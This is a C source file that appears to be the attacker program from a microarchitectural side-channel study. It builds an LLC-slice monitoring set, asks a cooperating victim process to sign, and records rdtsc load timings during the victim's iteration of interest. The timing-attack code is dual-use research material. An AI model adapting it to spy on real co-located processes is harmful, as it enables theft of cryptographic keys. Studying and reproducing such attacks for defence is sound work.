#include "../util/util.h"
#include "scutil/lotr.h"

#define BUF_SIZE 400 * 1024UL * 1024 /* Buffer Size -> 400*1MB */
#define MAXSAMPLES 100000

int main(int argc, char **argv)
{
	int i, j;

	// Check arguments
	if (argc != 6) {
		fprintf(stderr, "Wrong Input! Enter desired core ID, slice ID, repetitions, iteration of interest, and cleansing mechanism!\n");
		fprintf(stderr, "Enter: %s <core_ID> <slice_ID> <repetitions> <iteration_of_interest> <cleansing_mechanism>\n", argv[0]);
		exit(1);
	}

	// Parse core ID
	int core_ID;
	sscanf(argv[1], "%d", &core_ID);
	if (core_ID > NUMBER_OF_LOGICAL_CORES - 1 || core_ID < 0) {
		fprintf(stderr, "Wrong core! core_ID should be less than %d and more than 0!\n", NUMBER_OF_LOGICAL_CORES);
		exit(1);
	}

	// Parse slice number
	int slice_ID;
	sscanf(argv[2], "%d", &slice_ID);
	if (slice_ID > LLC_CACHE_SLICES - 1 || slice_ID < 0) {
		fprintf(stderr, "Wrong slice! slice_ID should be less than %d and more than 0!\n", LLC_CACHE_SLICES);
		exit(1);
	}

	// For this experiment we can use a fixed cache set
	int set_ID = 4;

	// Parse repetitions
	int repetitions;
	sscanf(argv[3], "%d", &repetitions);
	if (repetitions <= 0) {
		printf("Wrong repetitions! repetitions should be greater than 0!\n");
		exit(1);
	}

	// Parse victim iteration to attack
	int victim_iteration_no;
	sscanf(argv[4], "%d", &victim_iteration_no);
	if (victim_iteration_no <= 0) {
		printf("Wrong victim_iteration_no! victim_iteration_no should be greater than 0!\n");
		exit(1);
	}

	// Parse cleansing mechanism
	int cleansing_mechanism;
	sscanf(argv[5], "%d", &cleansing_mechanism);
	if (cleansing_mechanism != 1) {
		printf("Wrong cleansing_mechanism! cleansing_mechanism should be 1!\n");
		exit(1);
	}

	// Create file shared with victim
	volatile struct sharestruct *sharestruct = get_sharestruct();
	sharestruct->cleansing_mechanism = cleansing_mechanism;

	//////////////////////////////////////////////////////////////////////
	// Set up memory
	//////////////////////////////////////////////////////////////////////

	// Allocate large buffer (pool of addresses)
	void *buffer = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
	if (buffer == MAP_FAILED) {
		perror("mmap");
		exit(1);
	}

	// Write data to the buffer so that any copy-on-write
	// mechanisms will give us our own copies of the pages.
	memset(buffer, 0, BUF_SIZE);

	// Pin the monitoring program to the desired core
	//
	// This time we do not set the priority like in the RE because
	// doing so would use root and we want our actual attack
	// to be realistic for a user space process
	pin_cpu(core_ID);

	// Prepare monitoring set
	// Note that this time we use the optimization (no eviction set)
	unsigned long long monitoring_set_size = (unsigned long long)LLC_CACHE_WAYS;
	void **monitoring_set = NULL;
	void **current = NULL, **previous = NULL;
	uint64_t index1, index2, offset;

	// Find first address in our desired slice and given set
	offset = find_next_address_on_slice_and_set(buffer, slice_ID, set_ID);

	// Save this address in the monitoring set
	monitoring_set = (void **)(buffer + offset);

	// Get the L1 and L2 cache set indexes of the monitoring set
	index2 = get_cache_set_index((uint64_t)monitoring_set, 2);
	index1 = get_cache_set_index((uint64_t)monitoring_set, 1);

	// Find next addresses which are residing in the desired slice and the same sets in L2/L1
	// These addresses will distribute across 2 LLC sets
	current = monitoring_set;
	for (i = 1; i < monitoring_set_size; i++) {
		offset = L2_INDEX_STRIDE; // skip to the next address with the same L2 cache set index
		while (index1 != get_cache_set_index((uint64_t)current + offset, 1) ||
			   index2 != get_cache_set_index((uint64_t)current + offset, 2) ||
			   slice_ID != get_cache_slice_index(current + offset)) {
			offset += L2_INDEX_STRIDE;
		}

		// Set up pointer chasing. The idea is: *addr1 = addr2; *addr2 = addr3; and so on.
		*current = current + offset;
		current = *current;
	}

	// Make last item point back to the first one (useful for the loop)
	*current = monitoring_set;

	// Flush monitoring set
	current = monitoring_set;
	for (i = 0; i < monitoring_set_size; i++) {
		previous = current;
		current = *current;
		_mm_clflush(previous);
	}

	//////////////////////////////////////////////////////////////////////
	// Done setting up memory
	//////////////////////////////////////////////////////////////////////

	// Prepare samples array
	uint32_t *samples = (uint32_t *)malloc(sizeof(*samples) * MAXSAMPLES);

	fprintf(stderr, "READY\n");

	// Read addresses from memory into cache a few times
	// These lines will all fit in the LLC
	current = monitoring_set;
	for (i = 0; i < 10 * monitoring_set_size; i++) {
		asm volatile("movq (%0), %0"
					 : "+rm"(current) /* output */ ::"memory");
	}

	//////////////////////////////////////////////////////////////////////
	// Ready to go
	//////////////////////////////////////////////////////////////////////

	int rept_index;
	for (rept_index = 0; rept_index < repetitions; rept_index++) {

		// Prepare data output file
		char output_data_fn[6 + 4 + 9 + 1];
		sprintf(output_data_fn, "./out/%04d_data.out", rept_index);
		FILE *output_data;
		if (!(output_data = fopen(output_data_fn, "w"))) {
			perror("fopen");
			exit(1);
		}

		// Prepare
		current = monitoring_set;
		uint8_t active = 0;
		uint32_t waiting_for_victim = 0;

		// Double-check that the victim has not started yet
		if (sharestruct->iteration_of_interest_running) {
			fprintf(stderr, "victim already started?\n");
		}

		// Request the victim to sign
		sharestruct->sign_requested = victim_iteration_no;

		// Start monitoring loop
		for (i = 0; i < MAXSAMPLES; i++) {

			// Check if the victim's iteration of interest ended
			if (active) {
				if (!sharestruct->iteration_of_interest_running) {
					break;
				}
			}

			// Check if the victim's iteration of interest started
			if (!active) {
				i = 0;
				if (sharestruct->iteration_of_interest_running) {
					active = 1;

				} else {
					waiting_for_victim++;
					if (waiting_for_victim == 1000000) {
						fprintf(stderr, "Missed run - trying again\n");
						rept_index--;
						break;
					}
				}
			}

			asm volatile(
				".align 32\n\t"
				"lfence\n\t"
				"rdtsc\n\t"					/* eax = TSC (timestamp counter)*/
				// "shl $32, %%rdx\n\t"
				// "or %%rdx, %%rax\n\t"
				// "movq %%rax, %%r8\n\t"
				"movl %%eax, %%r8d\n\t"		/* r8d = eax; this is to back up eax into another register */
				"movq (%1), %1\n\t"			/* current = *current; LOAD */
				"movq (%1), %1\n\t"			/* current = *current; LOAD */
				"movq (%1), %1\n\t"			/* current = *current; LOAD */
				"movq (%1), %1\n\t"			/* current = *current; LOAD */
				"rdtscp\n\t"				/* eax = TSC (timestamp counter) */
				// "shl $32, %%rdx\n\t"
				// "or %%rdx, %%rax\n\t"
				// "sub %%r8, %%rax\n\t"
				"sub %%r8d, %%eax\n\t" 		/* eax = eax - r8d; get timing difference between the second timestamp and the first one */
				"movl %%eax, %0\n\t" 		/* samples[i] = eax */
				: "=rm"(samples[i]), "+rm"(current) /* output */
				:
				: "rax", "rcx", "rdx", "r8", "memory");
		}

		// Check that the victim's iteration of interest is actually ended
		if (sharestruct->iteration_of_interest_running || i >= MAXSAMPLES) {
			fprintf(stderr, "Unexpected. Was not able to monitor the entire iteration.\n");
			exit(1);
		}

		// Store the samples to disk
		int trace_length = i;
		for (i = 0; i < trace_length; i++) {
			fprintf(output_data, "%" PRIu32 "\n", samples[i]);
		}

		// Wait some time before next trace
		wait_cycles(150000000);

		// Close the files for this trace
		fclose(output_data);
	}

	// Free the buffers and file
	munmap(buffer, BUF_SIZE);
	free(samples);

	return 0;
}
